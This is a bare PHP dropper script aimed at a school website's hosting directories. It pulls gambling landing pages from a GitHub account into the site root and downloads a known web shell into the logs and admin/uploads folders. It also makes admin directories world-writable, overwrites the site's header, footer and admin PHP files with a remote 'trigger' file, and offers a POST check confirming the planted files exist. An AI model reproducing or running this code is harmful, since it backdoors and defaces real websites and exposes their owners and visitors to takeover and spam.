<?php

$cricket_LP = 'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/cricket/index.html';
$cricket_source = 'https://raw.githubusercontent.com/rootraven04/trig/main/sbps/cricket.html';

$rummy_LP = 'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/rummy/index.html';
$rummy_source = 'https://raw.githubusercontent.com/rootraven04/trig/main/sbps/rummy.html';

$current_cricket = file_get_contents($cricket_source);
$current_rummy = file_get_contents($rummy_source);


chmod('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/cricket/', 0755);
mkdir('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/cricket/');
chmod('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/cricket/', 0755);

chmod('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/rummy/', 0755);
mkdir('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/rummy/');
chmod('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/rummy/', 0755);


file_put_contents($cricket_LP,$current_cricket);
file_put_contents($rummy_LP,$current_rummy);

$shell_resources = 'C:/HostingSpaces/sbps/sbps.edu.in/logs/default.jsp';
$resources_didalam = 'C:/HostingSpaces/sbps/sbps.edu.in/logs/default.jsp';

$shell_satu =   'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/uploads/session.php';

mkdir('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/');
chmod('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/', 0777);
mkdir('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/uploads/');
chmod('C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/uploads/', 0777);

$trigger_satu = 'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/header.php';
$trigger_dua  = 'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/header.php';
$trigger_tiga = 'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/footer.php';
$trigger_empat = 'C:/HostingSpaces/sbps/sbps.edu.in/wwwroot/admin/admin.php';

$source_trigger = 'https://raw.githubusercontent.com/rootraven04/trig/main/sbps/trigger.php';


if (!file_exists($shell_resources)) {
    file_put_contents($shell_resources,file_get_contents('https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php'));
}

file_put_contents($shell_satu, file_get_contents($shell_resources));
file_put_contents($trigger_satu,file_get_contents($source_trigger));
file_put_contents($trigger_dua,file_get_contents($source_trigger));
file_put_contents($trigger_tiga,file_get_contents($source_trigger));
file_put_contents($trigger_empat,file_get_contents($source_trigger));

if (isset($_POST['cekfile'])) {
    if (file_exists($resources_didalam)) {
        echo 'Found '.filesize($resources_didalam).' '.$resources_didalam.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($shell_satu)) {
        echo 'Found '.filesize($shell_satu).' '.$shell_satu.' ';
    } else { echo 'Not_Found null null '; }

    if (file_exists($file_resources)) {
        echo 'Found '.filesize($file_resources).' '.$file_resources.' ';
    } else { echo 'Not_Found null null '; }
    if (file_exists($shell_empat)) {
        echo 'Found '.filesize($shell_empat).' '.$shell_empat.' ';
    } else { echo 'Not_Found null null '; }
}

?>
